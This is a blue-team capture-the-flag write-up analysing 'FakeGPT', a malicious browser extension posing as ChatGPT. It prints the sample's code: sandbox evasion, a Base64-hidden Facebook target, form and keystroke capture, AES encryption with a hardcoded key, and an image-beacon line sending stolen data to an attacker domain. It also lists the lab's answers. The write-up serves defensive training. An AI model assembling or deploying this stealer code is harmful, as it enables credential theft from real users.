# FakeGPT — Blue Team CTF Writeup
**Platform:** CyberDefenders  
**Category:** Browser Forensics / Malware Analysis  
**Difficulty:** Easy  
**Score:** 10/10  

---

![writer](/images/writeups/cyberdefenders/fakegpt/fakegpt.jpeg)

## Scenario

A malicious browser extension disguised as a "ChatGPT" helper was distributed to unsuspecting users. As a blue team analyst, you are tasked with reverse engineering the extension to understand its capabilities, exfiltration techniques, and indicators of compromise.

---

## Files Provided

After unzipping the lab archive (password: `cyberdefenders.org`), the following files were extracted:

| File | Description |
|------|-------------|
| `app.js` | Core malicious logic — credential theft & keylogging |
| `crypto.js` | AES encryption utility |
| `loader.js` | Anti-analysis / sandbox evasion loader |
| `manifest.json` | Extension configuration & permissions |
| `ui.html` | Fake ChatGPT popup UI |
| `img.GIF` | Decoy image asset |

---

## Analysis

### manifest.json — Extension Metadata

```json
{
  "manifest_version": 2,
  "name": "ChatGPT",
  "permissions": [
    "tabs", "http://*/*", "https://*/*",
    "storage", "webRequest", "webRequestBlocking", "cookies"
  ],
  "content_scripts": [{ "matches": ["<all_urls>"], "js": ["core/app.js"] }]
}
```

**Key observations:**
- Disguises itself as **"ChatGPT"** to appear legitimate
- Requests extremely broad permissions including `webRequestBlocking` and `cookies`
- Injects `app.js` into **every website** the user visits via `<all_urls>`

---

### loader.js — Anti-Analysis Evasion

```javascript
if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
    alert("Virtual environment detected. Extension will disable itself.");
    chrome.runtime.onMessage.addListener(() => { return false; });
}
```

The loader checks for sandbox/analysis environments before activating:
1. **First condition:** `navigator.plugins.length === 0` — sandboxes and headless browsers typically have no plugins
2. **Second condition:** `/HeadlessChrome/.test(navigator.userAgent)` — detects automated headless Chrome used by malware analysts

If either condition is true, the extension silently deactivates itself.

---

### app.js — Core Malicious Logic

#### Target Identification via Base64 Obfuscation

```javascript
const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
```

The target URL is hidden using **Base64** encoding:

```
d3d3LmZhY2Vib29rLmNvbQ== → www.facebook.com
```

The extension only activates its theft logic when the user is on **www.facebook.com**.

#### Credential Theft via Form Submit Event

```javascript
document.addEventListener('submit', function(event) {
    let username = formData.get('username') || formData.get('email');
    let password = formData.get('password');
    if (username && password) {
        exfiltrateCredentials(username, password);
    }
});
```

Listens for the **`submit`** event on all forms, capturing usernames/emails and passwords.

#### Keystroke Logging

```javascript
document.addEventListener('keydown', function(event) {
    var key = event.key;
    exfiltrateData('keystroke', key);
});
```

Every key pressed by the user is captured via the **`keydown`** event and exfiltrated.

#### AES Encryption of Stolen Data

```javascript
function encryptPayload(data) {
    const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
    const iv = CryptoJS.lib.WordArray.random(16);
    const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
    return iv.concat(encrypted.ciphertext).toString(CryptoJS.enc.Base64);
}
```

Before exfiltration, data is encrypted with **AES** using the hardcoded key **`SuperSecretKey123`** and a random IV.

#### Exfiltration via Image Beacon

```javascript
function sendToServer(encryptedData) {
    var img = new Image();
    img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
    document.body.appendChild(img);
}
```

Stolen data is sent to the C2 server **`Mo.Elshaheedy.com`** by creating a hidden `<img>` element. This **image beacon** technique bypasses many CSP and CORS restrictions since image requests are not subject to the same-origin policy.

---

## Questions & Answers

| # | Question | Answer |
|---|----------|--------|
| Q1 | Which encoding method does the browser extension use to obscure target URLs? | `Base64` |
| Q2 | Which website does the extension monitor for data theft? | `www.facebook.com` |
| Q3 | Which type of HTML element is utilized by the extension to send stolen data? | `img` |
| Q4 | What is the first specific condition in the code that triggers the extension to deactivate itself? | `navigator.plugins.length === 0` |
| Q5 | Which event does the extension capture to track user input submitted through forms? | `submit` |
| Q6 | Which API or method does the extension use to capture and monitor user keystrokes? | `keydown` |
| Q7 | What is the domain where the extension transmits the exfiltrated data? | `Mo.Elshaheedy.com` |
| Q8 | Which function in the code is used to exfiltrate user credentials? | `exfiltrateCredentials(username, password)` |
| Q9 | Which encryption algorithm is applied to secure the data before sending? | `AES` |
| Q10 | What does the extension access to store or manipulate session-related data? | `cookies` |

---

## Indicators of Compromise (IOCs)

| Type | Value |
|------|-------|
| C2 Domain | `Mo.Elshaheedy.com` |
| C2 Endpoint | `https://Mo.Elshaheedy.com/collect` |
| Target Site | `www.facebook.com` |
| Hardcoded Key | `SuperSecretKey123` |
| Extension Name | `ChatGPT` (spoofed) |

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|----|-------------|
| Credentials from Web Browsers | T1555.003 | Steals credentials from Facebook login forms |
| Keylogging | T1056.001 | Captures all keystrokes via `keydown` event |
| Exfiltration Over Web Service | T1567 | Sends data to `Mo.Elshaheedy.com` via image beacon |
| Obfuscated Files or Information | T1027 | Base64 encodes target URLs; encrypts payload with AES |
| Virtualization/Sandbox Evasion | T1497 | Detects headless Chrome and zero-plugin environments |
| Browser Extensions | T1176 | Malicious extension masquerading as ChatGPT |

---

## Conclusion

FakeGPT is a credential-stealing browser extension that impersonates the legitimate ChatGPT brand. It employs several evasion and obfuscation techniques — Base64 URL encoding, AES payload encryption, image beacon exfiltration, and sandbox detection — making it harder to detect during both static and dynamic analysis. The extension specifically targets Facebook credentials and keystrokes, sending them encrypted to an attacker-controlled domain.

**Key takeaways for defenders:**
- Audit browser extension permissions — `webRequestBlocking` + `cookies` + `<all_urls>` is a red flag
- Monitor outbound requests to unknown domains from browser processes
- Treat any extension named after popular AI tools with extra scrutiny
- Base64 strings in JavaScript source are a common obfuscation signal worth decoding